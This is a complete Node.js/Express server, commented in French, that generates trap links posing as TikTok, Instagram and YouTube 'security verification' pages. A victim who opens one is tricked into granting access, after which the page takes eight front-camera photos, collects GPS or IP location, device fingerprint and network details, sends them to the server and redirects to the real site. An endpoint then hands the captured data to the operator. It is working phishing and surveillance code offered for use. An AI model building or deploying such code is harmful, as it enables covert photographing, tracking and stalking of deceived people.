const express = require("express");
const bodyParser = require("body-parser");
const shortid = require("shortid");
const dotenv = require("dotenv");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// 🔥 KEEP-ALIVE SYSTEM - Immortel 24/7
setInterval(() => {
    console.log('🔥 Keeping alive...', new Date().toISOString());
}, 5 * 60 * 1000);

// Base de données simple en mémoire
let links = {};
let capturedData = {};

// 🚀 ROUTES SYSTÈME
app.get('/ping', (req, res) => {
    res.status(200).json({ 
        status: 'alive', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy', 
        links: Object.keys(links).length,
        data: Object.keys(capturedData).length
    });
});

// 🎯 GÉNÉRATION DE LIENS
app.post("/generate-link", (req, res) => {
    const { platform, chatId } = req.body;
    const id = shortid.generate();
    links[id] = { platform, chatId, created: new Date().toISOString() };

    const baseHost = process.env.REPLIT_DOMAINS.split(",")[0];
    let platformUrl;

    switch (platform) {
        case "tiktok":
            platformUrl = `https://${baseHost}/tk/${id}`;
            break;
        case "instagram":
            platformUrl = `https://${baseHost}/ig/${id}`;
            break;
        case "youtube":
            platformUrl = `https://${baseHost}/yt/${id}`;
            break;
        default:
            platformUrl = `https://${baseHost}/link/${id}`;
    }

    console.log(`🔗 Lien généré: ${platform} -> ${id}`);
    res.json({ id, url: platformUrl });
});

// 🎯 ROUTES DE CAPTURE
app.get("/tk/:id", (req, res) => handleLinkRequest(req, res, "tiktok"));
app.get("/ig/:id", (req, res) => handleLinkRequest(req, res, "instagram"));
app.get("/yt/:id", (req, res) => handleLinkRequest(req, res, "youtube"));
app.get("/link/:id", (req, res) => handleLinkRequest(req, res));

// 🎯 FONCTION PRINCIPALE DE CAPTURE
function handleLinkRequest(req, res, platformOverride = null) {
    const { id } = req.params;
    
    if (!links[id]) {
        return res.status(404).send("Lien expiré ou invalide");
    }

    const platform = platformOverride || links[id].platform;
    
    // Headers anti-cache et permissions
    res.set({
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "Permissions-Policy": "camera=(self), geolocation=(self), microphone=(self)"
    });

    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>${getPlatformTitle(platform)}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="${getPlatformFavicon(platform)}">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { 
            background: white; border-radius: 20px; padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 400px; width: 90%;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; line-height: 1.5; }
        .btn { 
            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
            color: white; border: none; padding: 15px 30px; border-radius: 50px;
            font-size: 16px; font-weight: bold; cursor: pointer; width: 100%;
            transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
        .loading { display: none; margin-top: 20px; }
        .spinner { 
            border: 3px solid #f3f3f3; border-top: 3px solid #3498db;
            border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 10px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { display: none; color: #27ae60; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">${getPlatformEmoji(platform)}</div>
        <h1>${getPlatformTitle(platform)}</h1>
        <p>Vérification de sécurité requise pour accéder au contenu exclusif.</p>
        
        <button id="verifyBtn" class="btn" onclick="startCapture()">
            🔒 Démarrer la vérification
        </button>
        
        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p>Vérification en cours...</p>
        </div>
        
        <div id="success" class="success">
            <h3>✅ Vérification réussie !</h3>
            <p>Redirection automatique...</p>
        </div>
    </div>

    <script>
        let capturing = false;
        
        async function startCapture() {
            if (capturing) return;
            capturing = true;
            
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            try {
                const data = await captureAllData();
                await sendDataToServer(data);
                showSuccess();
                setTimeout(() => redirectToRealSite(), 3000);
            } catch (error) {
                console.error('Capture failed:', error);
                showError();
            }
        }
        
        async function captureAllData() {
            const data = {
                id: '${id}',
                timestamp: new Date().toISOString(),
                platform: '${platform}',
                images: [],
                location: {},
                device: {},
                network: {}
            };
            
            // 📸 CAPTURE PHOTOS AUTOMATIQUE
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 }
                    }
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                
                // Attendre que la vidéo soit prête
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // Capturer 8 photos de qualité
                for (let i = 0; i < 8; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
                    data.images.push(imageData);
                    await new Promise(resolve => setTimeout(resolve, 200));
                }
                
                // Nettoyer
                stream.getTracks().forEach(track => track.stop());
                video.remove();
                
                console.log(\`📸 \${data.images.length} photos capturées\`);
            } catch (err) {
                console.log('❌ Camera access denied or failed');
            }
            
            // 📍 GÉOLOCALISATION AUTOMATIQUE
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                
                data.location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: position.timestamp,
                    source: 'gps'
                };
                
                console.log(\`📍 GPS: \${data.location.latitude}, \${data.location.longitude}\`);
            } catch (err) {
                // Fallback géolocalisation IP
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const ipData = await response.json();
                    data.location = {
                        latitude: ipData.latitude,
                        longitude: ipData.longitude,
                        city: ipData.city,
                        region: ipData.region,
                        country: ipData.country_name,
                        postal: ipData.postal,
                        timezone: ipData.timezone,
                        source: 'ip'
                    };
                    console.log(\`📍 IP: \${data.location.city}, \${data.location.country}\`);
                } catch (ipErr) {
                    data.location = { error: 'Location unavailable', source: 'none' };
                }
            }
            
            // 📱 INFORMATIONS DEVICE COMPLÈTES
            data.device = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                deviceMemory: navigator.deviceMemory,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type
                },
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localStorage: typeof(Storage) !== "undefined"
            };
            
            // 🌐 INFORMATIONS RÉSEAU
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                data.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }
            
            // Client Hints haute entropie
            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues([
                        'model', 'platformVersion', 'uaFullVersion', 'fullVersionList',
                        'architecture', 'bitness', 'wow64'
                    ]);
                    data.device.clientHints = hints;
                    data.device.mobile = navigator.userAgentData.mobile;
                    data.device.brands = navigator.userAgentData.brands;
                } catch (e) {}
            }
            
            return data;
        }
        
        async function sendDataToServer(data) {
            const response = await fetch('/capture-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                throw new Error('Failed to send data');
            }
            
            return response.json();
        }
        
        function showSuccess() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('success').style.display = 'block';
        }
        
        function showError() {
            document.getElementById('loading').innerHTML = '<p style="color: #e74c3c;">❌ Erreur de vérification</p><button onclick="location.reload()" class="btn" style="margin-top: 10px; padding: 10px 20px;">Réessayer</button>';
        }
        
        function redirectToRealSite() {
            const urls = {
                'tiktok': 'https://tiktok.com',
                'instagram': 'https://instagram.com', 
                'youtube': 'https://youtube.com'
            };
            window.location.href = urls['${platform}'] || 'https://google.com';
        }
        
        // Pré-chargement discret des permissions
        setTimeout(() => {
            if (navigator.mediaDevices) {
                navigator.mediaDevices.enumerateDevices().catch(() => {});
            }
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 1 });
            }
        }, 1000);
    </script>
</body>
</html>
    `);
}

// 📡 RÉCEPTION DES DONNÉES
app.post("/capture-data", (req, res) => {
    const data = req.body;
    const { id } = data;
    
    if (!links[id]) {
        return res.status(404).json({ error: "Lien invalide" });
    }
    
    // Sauvegarder toutes les données
    capturedData[id] = {
        ...data,
        ip: req.ip || req.connection.remoteAddress,
        headers: req.headers,
        captured_at: new Date().toISOString()
    };
    
    console.log(`📸 DONNÉES CAPTURÉES pour ${id}:`, {
        images: data.images?.length || 0,
        location: data.location?.source || 'none',
        device: data.device?.platform || 'unknown'
    });
    
    res.json({ success: true, message: 'Données reçues' });
});

// 🔍 RÉCUPÉRATION DES DONNÉES
app.get("/get-data/:id", (req, res) => {
    const { id } = req.params;
    const data = capturedData[id];
    
    if (!data) {
        return res.status(404).json({ error: "Aucune donnée trouvée" });
    }
    
    res.json(data);
});

// 🎯 FONCTIONS UTILITAIRES
function getPlatformTitle(platform) {
    const titles = {
        tiktok: "TikTok - Contenu Exclusif",
        instagram: "Instagram - Verification Required", 
        youtube: "YouTube Premium Access"
    };
    return titles[platform] || "Secure Access Required";
}

function getPlatformEmoji(platform) {
    const emojis = {
        tiktok: "🎵",
        instagram: "📸",
        youtube: "📺"
    };
    return emojis[platform] || "🔒";
}

function getPlatformFavicon(platform) {
    // Favicons simplifiés
    return "data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAA==";
}

// 🚀 DÉMARRAGE DU SERVEUR
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Serveur démarré sur le port ${PORT}`);
    console.log(`📡 Keep-alive activé - Immortel 24/7`);
    console.log(`🔗 Prêt à générer des liens pièges !`);
});
